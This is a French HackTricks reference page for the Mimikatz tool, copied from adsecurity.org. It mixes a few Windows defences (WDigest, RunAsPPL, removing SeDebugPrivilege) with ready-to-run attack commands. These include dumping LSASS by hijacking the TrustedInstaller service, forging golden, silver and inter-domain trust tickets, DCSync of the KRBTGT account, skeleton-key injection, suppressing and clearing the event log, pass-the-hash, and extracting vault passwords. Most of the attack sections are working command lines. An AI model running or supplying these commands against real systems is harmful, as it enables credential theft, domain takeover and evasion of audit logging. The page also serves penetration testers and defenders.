# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Vous voulez voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord**](https://discord.gg/hRep4RUj7f) ou le **groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Le contenu de cette page a été copié depuis [adsecurity.org](https://adsecurity.org/?page\_id=1821)

## LM et texte en clair en mémoire

À partir de Windows 8.1 et de Windows Server 2012 R2, le hachage LM et le mot de passe en "texte clair" ne sont plus en mémoire.

Pour empêcher que le mot de passe en "texte clair" ne soit placé dans LSASS, la clé de registre suivante doit être définie sur "0" (Digest Disabled) :

_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential" (DWORD)_

## **Mimikatz & Protection LSA :**

Windows Server 2012 R2 et Windows 8.1 incluent une nouvelle fonctionnalité appelée Protection LSA qui implique l'activation de [LSASS en tant que processus protégé sur Windows Server 2012 R2](https://technet.microsoft.com/en-us/library/dn408187.aspx) (Mimikatz peut contourner avec un pilote, mais cela devrait générer des journaux d'événements) :

_La LSA, qui inclut le processus Local Security Authority Server Service (LSASS), valide les utilisateurs pour les connexions locales et à distance et applique les politiques de sécurité locales. Le système d'exploitation Windows 8.1 fournit une protection supplémentaire pour la LSA afin d'empêcher la lecture de la mémoire et l'injection de code par des processus non protégés. Cela offre une sécurité supplémentaire pour les informations d'identification que la LSA stocke et gère._

Activation de la protection LSA :

1. Ouvrez l'Éditeur du Registre (RegEdit.exe) et accédez à la clé de registre située à : HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa et définissez la valeur de la clé de registre sur : "RunAsPPL"=dword:00000001.
2. Créez un nouveau GPO et accédez à Configuration de l'ordinateur, Préférences, Paramètres Windows. Cliquez avec le bouton droit sur Registre, pointez sur Nouveau, puis cliquez sur Élément de Registre. La boîte de dialogue Nouvelles propriétés du Registre apparaît. Dans la liste de la ruche, cliquez sur HKEY\_LOCAL\_MACHINE. Dans la liste du chemin de la clé, accédez à SYSTEM\CurrentControlSet\Control\Lsa. Dans la zone de nom de la valeur, saisissez RunAsPPL. Dans la zone de type de valeur, cliquez sur REG\_DWORD. Dans la zone de données de la valeur, saisissez 00000001. Cliquez sur OK.

La protection LSA empêche les processus non protégés d'interagir avec LSASS. Mimikatz peut toujours contourner cela avec un pilote ("!+").

[![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)

### Contournement de SeDebugPrivilege désactivé
Par défaut, le privilège SeDebugPrivilege est accordé au groupe Administrateurs via la Stratégie de sécurité locale. Dans un environnement Active Directory, [il est possible de supprimer ce privilège](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5) en définissant Configuration de l'ordinateur --> Stratégies --> Paramètres Windows --> Paramètres de sécurité --> Stratégies locales --> Attributions des droits des utilisateurs --> Programmes de débogage définis comme un groupe vide. Même sur des appareils connectés à un AD hors ligne, ce paramètre ne peut pas être écrasé et les Administrateurs locaux recevront une erreur lorsqu'ils tenteront de vider la mémoire ou d'utiliser Mimikatz.

Cependant, le compte TrustedInstaller aura toujours accès pour vider la mémoire et [peut être utilisé pour contourner cette défense](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled). En modifiant la configuration du service TrustedInstaller, le compte peut être exécuté pour utiliser ProcDump et vider la mémoire pour `lsass.exe`.
```
sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
sc start TrustedInstaller
```
[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)

Ce fichier de vidage peut être exfiltré vers un ordinateur contrôlé par un attaquant où les informations d'identification peuvent être extraites.
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Principal

### **ÉVÉNEMENT**

**ÉVÉNEMENT::Effacer** – Effacer un journal d'événements\
[\
![Mimikatz-Event-Clear](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)

**ÉVÉNEMENT:::Désactiver** – (_**expérimental**_) Patch du service Événements pour éviter de nouveaux événements

[![Mimikatz-Event-Drop](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)

Remarque :\
Exécutez privilege::debug puis event::drop pour patcher le journal d'événements. Ensuite, exécutez Event::Clear pour effacer le journal d'événements sans qu'un événement de journal effacé (1102) ne soit enregistré.

### KERBEROS

#### Ticket d'Or

Un Ticket d'Or est un TGT utilisant le hachage de mot de passe NTLM de KRBTGT pour chiffrer et signer.

Un Ticket d'Or (GT) peut être créé pour se faire passer pour n'importe quel utilisateur (réel ou imaginaire) dans le domaine en tant que membre de n'importe quel groupe dans le domaine (fournissant une quantité virtuellement illimitée de droits) pour n'importe quelle ressource dans le domaine.

**Référence de Commande Ticket d'Or Mimikatz :**

La commande Mimikatz pour créer un ticket d'or est "kerberos::golden"

* /domain – le nom de domaine complet. Dans cet exemple : "lab.adsecurity.org".
* /sid – le SID du domaine. Dans cet exemple : "S-1-5-21-1473643419-774954089-2222329127".
* /sids – SIDs supplémentaires pour les comptes/groupes dans la forêt AD avec les droits que vous souhaitez que le ticket simule. Typiquement, il s'agira du groupe Administrateurs de l'entreprise pour le domaine racine "S-1-5-21-1473643419-774954089-5872329127-519". [Ce paramètre ajoute les SIDs fournis au paramètre Historique des SID.](https://adsecurity.org/?p=1640)
* /user – nom d'utilisateur à imiter
* /groups (optionnel) – RID des groupes dont l'utilisateur est membre (le premier est le groupe principal).\
Ajoutez les RID des comptes utilisateur ou ordinateur pour recevoir le même accès.\
Groupes par défaut : 513,512,520,518,519 pour les groupes Administrateurs bien connus (listés ci-dessous).
* /krbtgt – hachage de mot de passe NTLM pour le compte de service KDC du domaine (KRBTGT). Utilisé pour chiffrer et signer le TGT.
* /ticket (optionnel) – fournir un chemin et un nom pour enregistrer le fichier Ticket d'Or pour une utilisation ultérieure ou utiliser /ptt pour injecter immédiatement le ticket d'or en mémoire pour une utilisation.
* /ptt – en alternative à /ticket – utilisez ceci pour injecter immédiatement le ticket falsifié en mémoire pour une utilisation.
* /id (optionnel) – RID de l'utilisateur. La valeur par défaut de Mimikatz est 500 (le RID du compte Administrateur par défaut).
* /startoffset (optionnel) – le décalage de début lorsque le ticket est disponible (généralement réglé sur -10 ou 0 si cette option est utilisée). La valeur par défaut de Mimikatz est 0.
* /endin (optionnel) – durée de vie du ticket. La valeur par défaut de Mimikatz est de 10 ans (\~5 262 480 minutes). Le paramètre de stratégie Kerberos par défaut de l'Active Directory est de 10 heures (600 minutes).
* /renewmax (optionnel) – durée de vie maximale du ticket avec renouvellement. La valeur par défaut de Mimikatz est de 10 ans (\~5 262 480 minutes). Le paramètre de stratégie Kerberos par défaut de l'Active Directory est de 7 jours (10 080 minutes).
* /sids (optionnel) – défini comme le SID du groupe Administrateurs de l'entreprise dans la forêt AD (\[SIDDomaineRacineAD\]-519) pour simuler les droits d'Administrateur d'entreprise dans toute la forêt AD (administrateur AD dans chaque domaine de la forêt AD).
* /aes128 – la clé AES128
* /aes256 – la clé AES256

Groupes par défaut du Ticket d'Or :

* SID des Utilisateurs du Domaine : S-1-5-21\<IDDOMAINE>-513
* SID des Administrateurs du Domaine : S-1-5-21\<IDDOMAINE>-512
* SID des Administrateurs de Schéma : S-1-5-21\<IDDOMAINE>-518
* SID des Administrateurs d'Entreprise : S-1-5-21\<IDDOMAINE>-519 (cela est efficace uniquement lorsque le ticket falsifié est créé dans le domaine racine de la forêt, bien qu'il soit ajouté en utilisant le paramètre /sids pour les droits d'administrateur de la forêt AD)
* SID des Propriétaires de la Création de Stratégie de Groupe : S-1-5-21\<IDDOMAINE>-520
```
.\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
[Billets d'or à travers les domaines](https://adsecurity.org/?p=1640)

#### Billet d'Argent

Un Billet d'Argent est un TGS (similaire au TGT en format) utilisant le hachage de mot de passe NTLM du compte de service cible (identifié par la correspondance SPN) pour chiffrer et signer.

**Exemple de Commande Mimikatz pour Créer un Billet d'Argent:**

La commande Mimikatz suivante crée un Billet d'Argent pour le service CIFS sur le serveur adsmswin2k8r2.lab.adsecurity.org. Pour que ce Billet d'Argent soit créé avec succès, le hachage de mot de passe du compte d'ordinateur AD pour adsmswin2k8r2.lab.adsecurity.org doit être découvert, soit à partir d'un vidage de domaine AD, soit en exécutant Mimikatz sur le système local comme indiqué ci-dessus (_Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit_). Le hachage de mot de passe NTLM est utilisé avec le paramètre /rc4. Le type de SPN de service doit également être identifié dans le paramètre /service. Enfin, le nom de domaine complet de l'ordinateur cible doit être fourni dans le paramètre /target. N'oubliez pas l'identifiant SID du domaine dans le paramètre /sid.
```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```
#### [**Billet de confiance**](https://adsecurity.org/?p=1588)

Une fois que le hachage du mot de passe de confiance Active Directory est déterminé, un billet de confiance peut être généré. Les billets de confiance sont créés en utilisant le mot de passe partagé entre 2 domaines qui se font mutuellement confiance.\
[Plus d'informations sur les billets de confiance.](https://adsecurity.org/?p=1588)

**Extraction des mots de passe de confiance (clés de confiance)**
```
Mimikatz “privilege::debug” “lsadump::trust /patch” exit
```
**Créer un billet de confiance falsifié (TGT inter-domaines) en utilisant Mimikatz**

Forgez le billet de confiance qui indique que le détenteur du billet est un administrateur d'entreprise dans la forêt AD (en exploitant SIDHistory, "sids", à travers les confiances dans Mimikatz, ma "contribution" à Mimikatz). Cela permet un accès administratif complet d'un domaine enfant au domaine parent. Notez que ce compte n'a pas besoin d'exister quelque part car il s'agit effectivement d'un Golden Ticket à travers la confiance.
```
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
```
### Paramètres requis spécifiques de Trust Ticket :

* \*\*/\*\*cible – le FQDN du domaine cible.
* \*\*/\*\*service – le service Kerberos s'exécutant dans le domaine cible (krbtgt).
* \*\*/\*\*rc4 – le hachage NTLM pour le compte de service du service Kerberos (krbtgt).
* \*\*/\*\*ticket – fournir un chemin et un nom pour enregistrer le fichier de ticket forgé pour une utilisation ultérieure ou utiliser /ptt pour injecter immédiatement le golden ticket en mémoire pour une utilisation immédiate.

#### **Plus de KERBEROS**

**KERBEROS::List** – Liste tous les tickets d'utilisateur (TGT et TGS) en mémoire utilisateur. Aucun privilège spécial requis car il affiche uniquement les tickets de l'utilisateur actuel.\
Similaire à la fonctionnalité de "klist".

**KERBEROS::PTC** – passer le cache (NT6)\
Les systèmes *Nix tels que Mac OS, Linux, BSD, Unix, etc. mettent en cache les informations d'identification Kerberos. Ces données mises en cache peuvent être copiées et transmises à l'aide de Mimikatz. Utile également pour injecter des tickets Kerberos dans des fichiers ccache.

Un bon exemple de kerberos::ptc de Mimikatz est lors de l'exploitation de MS14-068 avec PyKEK. PyKEK génère un fichier ccache qui peut être injecté avec Mimikatz en utilisant kerberos::ptc.

**KERBEROS::PTT** – passer le ticket\
Après qu'un ticket Kerberos a été trouvé, il peut être copié sur un autre système et transmis à la session actuelle, simulant ainsi une connexion sans aucune communication avec le contrôleur de domaine. Aucun droit spécial requis.\
Similaire à SEKURLSA::PTH (Pass-The-Hash).

* /nom_fichier – le nom du fichier du ticket (peut être multiple)
* /répertoire – un chemin de répertoire, tous les fichiers .kirbi à l'intérieur seront injectés.

**KERBEROS::Purge** – purger tous les tickets Kerberos\
Similaire à la fonctionnalité de "klist purge". Exécutez cette commande avant de transmettre des tickets (PTC, PTT, etc.) pour garantir que le contexte utilisateur correct est utilisé.

**KERBEROS::TGT** – obtenir le TGT actuel pour l'utilisateur actuel.

### LSADUMP

**LSADUMP**::**DCShadow** – Définit les machines actuelles comme DC pour avoir la capacité de créer de nouveaux objets à l'intérieur du DC (méthode persistante).\
Cela nécessite des droits d'administration AD complets ou le hachage du mot de passe KRBTGT.\
DCShadow définit temporairement l'ordinateur comme "DC" aux fins de réplication :

* Crée 2 objets dans la partition Configuration de la forêt AD.
* Met à jour le SPN de l'ordinateur utilisé pour inclure "GC" (Global Catalog) et "E3514235-4B06-11D1-AB04-00C04FC2DCD2" (Réplication AD). Plus d'informations sur les noms de principal de service Kerberos dans la [section SPN d'ADSecurity](https://adsecurity.org/?page\_id=183).
* Pousse les mises à jour vers les DC via DrsReplicaAdd et KCC.
* Supprime les objets créés de la partition Configuration.

**LSADUMP::DCSync** – demande à un DC de synchroniser un objet (obtenir des données de mot de passe pour un compte)\
[Nécessite l'appartenance à Administrateur de domaine, Administrateurs de domaine, ou une délégation personnalisée.](https://adsecurity.org/?p=1729)

Une fonctionnalité majeure ajoutée à Mimkatz en août 2015 est "DCSync" qui "usurpe" efficacement un contrôleur de domaine et demande les données de mot de passe du compte au contrôleur de domaine ciblé.

**Options de DCSync :**

* /all – DCSync extrait des données pour l'ensemble du domaine.
* /utilisateur – ID utilisateur ou SID de l'utilisateur pour lequel vous souhaitez extraire les données.
* /domaine (optionnel) – FQDN du domaine Active Directory. Mimikatz découvrira un DC dans le domaine auquel se connecter. Si ce paramètre n'est pas fourni, Mimikatz utilise par défaut le domaine actuel.
* /csv – exportation au format csv
* /dc (optionnel) – Spécifiez le contrôleur de domaine auquel DCSync doit se connecter et collecter des données.

Il y a également un paramètre /guid.

**Exemples de commandes DCSync :**

Extraire les données de mot de passe pour le compte utilisateur KRBTGT dans le domaine rd.adsecurity.org :\
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt" exit_

Extraire les données de mot de passe pour le compte utilisateur Administrateur dans le domaine rd.adsecurity.org :\
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:Administrateur" exit_

Extraire les données de mot de passe pour le compte ordinateur ADSDC03 du contrôleur de domaine dans le domaine lab.adsecurity.org :\
_Mimikatz "lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$" exit_

**LSADUMP::LSA** – Demander au serveur LSA de récupérer l'entreprise SAM/AD (normal, patch en vol ou injecter). Utilisez /patch pour un sous-ensemble de données, utilisez /inject pour tout. _Nécessite des droits Système ou de Débogage._

* /inject – Injecter LSASS pour extraire des informations d'identification
* /nom – nom du compte pour le compte utilisateur cible
* /id – RID pour le compte utilisateur cible
* /patch – patch LSASS.

Souvent, les comptes de service sont membres de Domain Admins (ou équivalent) ou un administrateur de domaine s'est récemment connecté à l'ordinateur à partir duquel un attaquant peut extraire des informations d'identification. En utilisant ces informations d'identification, un attaquant peut accéder à un contrôleur de domaine et obtenir toutes les informations d'identification du domaine, y compris le hachage NTLM du compte KRBTGT utilisé pour créer des Golden Tickets Kerberos.
```
mimikatz lsadump::lsa /inject exit
```
**LSADUMP::NetSync**

NetSync offre un moyen simple d'utiliser les données de mot de passe du compte informatique d'un DC pour se faire passer pour un contrôleur de domaine via un Silver Ticket et de synchroniser les informations du compte cible, y compris les données de mot de passe.

**LSADUMP::SAM** - obtenir le SysKey pour décrypter les entrées SAM (du registre ou de la ruche). L'option SAM se connecte à la base de données locale du Gestionnaire de comptes de sécurité (SAM) et extrait les informations d'identification des comptes locaux.

**LSADUMP::Secrets** - obtenir le SysKey pour décrypter les entrées SECRETS (du registre ou des ruches).

**LSADUMP::SetNTLM** - Demander à un serveur de définir un nouveau mot de passe/ntlm pour un utilisateur.

[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) - Demander au serveur LSA de récupérer les informations d'authentification de confiance (normales ou patchées à la volée).

### MISC

[**MISC::Skeleton**](https://adsecurity.org/?p=1275) - Injecter une clé Skeleton dans le processus LSASS sur le contrôleur de domaine.
```
"privilege::debug" "misc::skeleton"
```
### PRIVILÈGE

**PRIVILEGE::Backup** - obtenir le privilège/droits de sauvegarde. Nécessite des droits de débogage.

**PRIVILEGE::Debug** - obtenir des droits de débogage (ceci ou les droits du système local sont requis pour de nombreuses commandes Mimikatz).

### SEKURLSA

**SEKURLSA::Credman** - Liste le gestionnaire d'informations d'identification

**SEKURLSA::Ekeys** - Liste les clés de chiffrement Kerberos

**SEKURLSA::Kerberos** - Liste les informations d'identification Kerberos pour tous les utilisateurs authentifiés (y compris les services et le compte d'ordinateur)

**SEKURLSA::Krbtgt** - obtenir les données de mot de passe du compte de service Kerberos du domaine (KRBTGT)

**SEKURLSA::SSP** - Liste les informations d'identification SSP

**SEKURLSA::Wdigest** - Liste les informations d'identification WDigest

**SEKURLSA::LogonPasswords** - liste toutes les informations d'identification du fournisseur disponibles. Cela montre généralement les informations d'identification de l'utilisateur connecté récemment et de l'ordinateur.

* Extrait les données de mot de passe dans LSASS pour les comptes actuellement connectés (ou connectés récemment) ainsi que pour les services s'exécutant sous le contexte des informations d'identification de l'utilisateur.
* Les mots de passe des comptes sont stockés en mémoire de manière réversible. S'ils sont en mémoire (avant Windows 8.1/Windows Server 2012 R2, ils l'étaient), ils sont affichés. Windows 8.1/Windows Server 2012 R2 ne stocke pas le mot de passe du compte de cette manière dans la plupart des cas. KB2871997 "rétroporte" cette capacité de sécurité à Windows 7, Windows 8, Windows Server 2008R2 et Windows Server 2012, bien que l'ordinateur nécessite une configuration supplémentaire après l'application de KB2871997.
* Nécessite un accès administrateur (avec des droits de débogage) ou des droits du système local

**SEKURLSA::Minidump** - bascule vers le contexte de processus de minidump LSASS (lit le dump lsass)

**SEKURLSA::Pth** - Pass-the-Hash et Over-Pass-the-Hash (alias passer la clé).

_Mimikatz peut effectuer l'opération bien connue 'Pass-The-Hash' pour exécuter un processus sous d'autres informations d'identification avec le hachage NTLM du mot de passe de l'utilisateur, au lieu de son vrai mot de passe. Pour cela, il lance un processus avec une fausse identité, puis remplace les fausses informations (hachage NTLM du faux mot de passe) par les vraies informations (hachage NTLM du vrai mot de passe)._

* /user - le nom d'utilisateur que vous souhaitez usurper, gardez à l'esprit que Administrateur n'est pas le seul nom pour ce compte bien connu.
* /domain - le nom de domaine complet - sans domaine ou en cas d'utilisateur/administrateur local, utilisez le nom de l'ordinateur ou du serveur, le groupe de travail ou autre.
* /rc4 ou /ntlm - optionnel - la clé RC4 / hachage NTLM du mot de passe de l'utilisateur.
* /run - optionnel - la ligne de commande à exécuter - par défaut : cmd pour avoir un shell.

[![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)

**SEKURLSA::Tickets** - Liste tous les tickets Kerberos disponibles pour tous les utilisateurs authentifiés récemment, y compris les services s'exécutant sous le contexte d'un compte utilisateur et le compte d'ordinateur AD local.\
Contrairement à kerberos::list, sekurlsa utilise la lecture en mémoire et n'est pas soumis aux restrictions d'exportation de clés. sekurlsa peut accéder aux tickets d'autres sessions (utilisateurs).

* /export - optionnel - les tickets sont exportés dans des fichiers .kirbi. Ils commencent par l'UID de l'utilisateur et le numéro de groupe (0 = TGS, 1 = ticket client(?) et 2 = TGT)

Similaire à l'extraction d'informations d'identification à partir de LSASS, en utilisant le module sekurlsa, un attaquant peut obtenir toutes les données de tickets Kerberos en mémoire sur un système, y compris ceux appartenant à un administrateur ou à un service.\
Cela est extrêmement utile si un attaquant a compromis un serveur web configuré pour la délégation Kerberos que les utilisateurs accèdent avec un serveur SQL en arrière-plan. Cela permet à un attaquant de capturer et de réutiliser tous les tickets d'utilisateur en mémoire sur ce serveur.

La commande "kerberos::tickets" de mimikatz extrait les tickets Kerberos de l'utilisateur connecté actuellement et ne nécessite pas de droits élevés. En exploitant la capacité du module sekurlsa à lire depuis la mémoire protégée (LSASS), tous les tickets Kerberos sur le système peuvent être extraits.

Commande : _mimikatz sekurlsa::tickets exit_

* Extrait tous les tickets Kerberos authentifiés sur un système.
* Nécessite un accès administrateur (avec débogage) ou des droits du système local

### **SID**

Le module SID de Mimikatz remplace MISC::AddSID. Utilisez SID::Patch pour patcher le service ntds.

**SID::add** - Ajoute un SID à SIDHistory d'un objet

[![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)

**SID::modify** - Modifie le SID d'objet d'un objet

[![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)

### **TOKEN**

Le module Token de Mimikatz permet à Mimikatz d'interagir avec les jetons d'authentification Windows, y compris la récupération et l'usurpation des jetons existants.

**TOKEN::Elevate** - usurper un jeton. Utilisé pour élever les autorisations à SYSTEM (par défaut) ou trouver un jeton d'administrateur de domaine sur la machine en utilisant l'API Windows.\
_Nécessite des droits d'administrateur._

[![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)

Trouver une information d'identification d'administrateur de domaine sur la machine et utiliser ce jeton : _token::elevate /domainadmin_

[![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)

**TOKEN::List** - liste tous les jetons du système

### **TS**

**TS::MultiRDP** - (expérimental) Patche le service Terminal Server pour permettre à plusieurs utilisateurs

[![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)

**TS::Sessions** - Liste les sessions TS/RDP.

![](https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png)

### Vault

`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - Obtenir les mots de passe des tâches planifiées

\
\
\\

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
